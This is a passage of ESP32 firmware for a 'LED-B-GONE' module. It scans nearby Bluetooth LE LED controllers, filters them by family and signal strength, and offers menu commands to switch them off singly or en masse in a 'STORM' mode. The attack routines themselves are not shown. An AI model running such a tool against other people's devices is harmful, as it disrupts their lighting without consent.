        if (on) d.fillRoundRect(1, y - 1, W - 2, lh - 1, 3, menuSelectedBackgroundColor);
        d.setTextSize(1.5);
        if (i == 0) {
          d.setTextColor(on ? LB_WHITE : menuTextUnFocusedColor, on ? menuSelectedBackgroundColor : LB_BG);
          d.setCursor(6, y + 1); d.print("Scope allowlist");
          d.setTextColor(g_scopeOn ? LB_OK : LB_GREY, on ? menuSelectedBackgroundColor : LB_BG);
          d.setCursor(W - 34, y + 1); d.print(g_scopeOn ? "ON" : "OFF");
        } else if (i == 1) {
          d.setTextColor(on ? LB_WHITE : menuTextUnFocusedColor, on ? menuSelectedBackgroundColor : LB_BG);
          d.setCursor(6, y + 1); d.print("RSSI min");
          d.setTextColor(LB_ACC, on ? menuSelectedBackgroundColor : LB_BG);
          d.setCursor(W - 52, y + 1); d.printf("%d dBm", g_rssiMin);
        } else {
          int fi = FAM_ELK + (i - 2);
          lbChip(6, y + 1, FAM_LBL[fi], FAM_COL[fi]);
          d.setTextColor(g_famEnabled[fi] ? LB_OK : LB_GREY, on ? menuSelectedBackgroundColor : LB_BG);
          d.setTextSize(1.5); d.setCursor(W - 34, y + 1); d.print(g_famEnabled[fi] ? "on" : "off");
        }
      }
      lbFooter("ENTER toggle   ; / . move   DEL back");
      d.display();
      lastSel = sel; lastTop = top; dirty = false;
    }
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }
    else if (kp(';')) { sel = (sel - 1 + NROWS) % NROWS; delay(140); }
    else if (kp('.')) { sel = (sel + 1) % NROWS; delay(140); }
    else if (kp(KEY_ENTER)) {
      if (sel == 0) { g_scopeOn = !g_scopeOn; lg(String("scope=") + (g_scopeOn ? "ON" : "OFF")); }
      else if (sel == 1) { g_rssiMin += 10; if (g_rssiMin > -40) g_rssiMin = -100; lg(String("rssiMin=") + g_rssiMin); }
      else { int fi = FAM_ELK + (sel - 2); g_famEnabled[fi] = !g_famEnabled[fi]; lg(String("fam ") + FAM_LBL[fi] + "=" + g_famEnabled[fi]); }
      enterDebounce(); dirty = true;
    }
    delay(30);
  }
}

} // namespace ledbg

// ===========================================================================
//  Point d'entree menu  (0 RAM au boot : init BLE ici, deinit a la sortie)
// ===========================================================================
void ledbgoneMenu() {
  using namespace ledbg;
  enterDebounce();
  // Couper le WiFi avant d'init le BLE (RAM) : LED-B-GONE n'a pas besoin du reseau.
  bool wifiWas = (WiFi.getMode() != WIFI_OFF);
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
  if (!BLEDevice::getInitialized()) BLEDevice::init("");
  BLEDevice::setPower(ESP_PWR_LVL_P9);               // TX max (portee)
  lg("enter (BLE up)");

  std::vector<Target>* tv = new std::vector<Target>();
  BLEClient* cli = BLEDevice::createClient();
  scanTargets(*tv);
  int sel = 0, lastSel = -1, lastCount = -1;   // redraw-on-change : evite le scintillement

  while (true) {
    if (sel >= (int)tv->size()) sel = tv->size() ? tv->size() - 1 : 0;
    if (sel != lastSel || (int)tv->size() != lastCount) {   // ne redessine QUE si ca change
      drawTargets(*tv, sel, "ENT panel  o OFF  s STORM  r scan  g cfg");
      lastSel = sel; lastCount = tv->size();
    }
    cardUpdate();
    if (kp(KEY_BACKSPACE) || kp('`')) { backDebounce(); break; }
    else if (kp(';')) { if (tv->size()) sel = (sel - 1 + tv->size()) % tv->size(); delay(140); }
    else if (kp('.')) { if (tv->size()) sel = (sel + 1) % tv->size(); delay(140); }
    else if (kp(KEY_ENTER)) { if (tv->size()) { enterDebounce(); panel((*tv)[sel], cli); } keyRelease(); lastSel = -1; }
    else if (kp('o')) { if (tv->size()) sweepOff(*tv, cli); keyRelease(); lastSel = -1; }
    else if (kp('s')) { if (tv->size()) stormZone(*tv, cli); keyRelease(); lastSel = -1; }
    else if (kp('r')) { scanTargets(*tv); sel = 0; keyRelease(); lastSel = -1; }
    else if (kp('g')) { settings(); keyRelease(); lastSel = -1; }
    delay(30);
  }

  if (cli->isConnected()) cli->disconnect();
  delete tv;
  if (BLEDevice::getInitialized()) BLEDevice::deinit(false);  // demonte le BLE SANS mem_release one-shot
                                                    // (deinit(true) -> esp_bt_controller_mem_release ESP_FAIL -> abort au prochain module)
  if (wifiWas) { WiFi.mode(WIFI_STA); }              // restaure le mode STA pour les autres features
  lg("exit (BLE down)");
  waitAndReturnToMenu("LED-B-Gone off");
}
